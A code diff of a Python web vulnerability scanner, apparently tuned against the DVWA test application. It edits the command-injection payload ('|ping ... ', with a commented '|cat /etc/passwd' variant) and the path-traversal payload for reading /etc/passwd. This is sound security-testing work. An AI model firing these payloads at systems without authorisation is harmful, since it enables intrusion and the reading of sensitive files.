@@ -499,6 +499,9 @@ class Utilities(ScanConfigParameters):
             input_fields = form.find_all('input')
             for field in input_fields:
                 if field.get('name'):
+                    if str(field.get('name')).lower() == 'submit':
+                        form_data[field.get('name')] = field.get('value')
+                        continue
                     form_data[field.get('name')] = ''  # might need back field.get('value', '')
         except Exception as e:
             self.print_except_message('error', e, "Something went wrong when extracting forms details.")
@@ -1169,11 +1172,11 @@ class Scanner(Utilities):
     def t_i_code_exec(self, url, form, form_data):
         try:
             # Detects blind and standard Code Exec (Ping for 3 seconds)
-            code_exec_payload = "| ping -c 3 127.0.0.1"
+            code_exec_payload = "|ping -c 7 127.0.0.1" # 8.8.8.8|cat /etc/passwd # TODO :Find DVWA PAyload for HIGH
             # Get injection points and inject the payload.
             injection_keys = self.extract_injection_fields_from_form(form_data)
             for injection_key in injection_keys:
-                form_data[injection_key] = code_exec_payload
+                form_data[injection_key] = html.unescape(code_exec_payload)
             response = self.submit_form(url, form, form_data)
             if not response:
                 return 0
@@ -1742,7 +1745,7 @@ class Scanner(Utilities):
 
     def t_i_lfi(self, url):
         try:
-            lfi_script = '../../../etc/passwd'
+            lfi_script = '/../../../etc/passwd' # TODO: Find for DVWA HIGH
             if '=' in url:
                 url = url.replace("=", "=" + lfi_script)
                 if "root:" in self.session.get(url).text.lower():
@@ -1751,7 +1754,7 @@ class Scanner(Utilities):
             for index, form in enumerate(form_list):
                 injection_keys = self.extract_injection_fields_from_form(form_data_list[index])
                 # for html_payload in self.DataStorage.payloads("HTML"): #TODO: Add more payloads LFI/RFI
-                lfi_script = '../../../etc/passwd'
+                lfi_script = '/../../../etc/passwd'
                 # Inject each payload into each injection point
                 for injection_key in injection_keys:
                     form_data_list[index][injection_key] = lfi_script
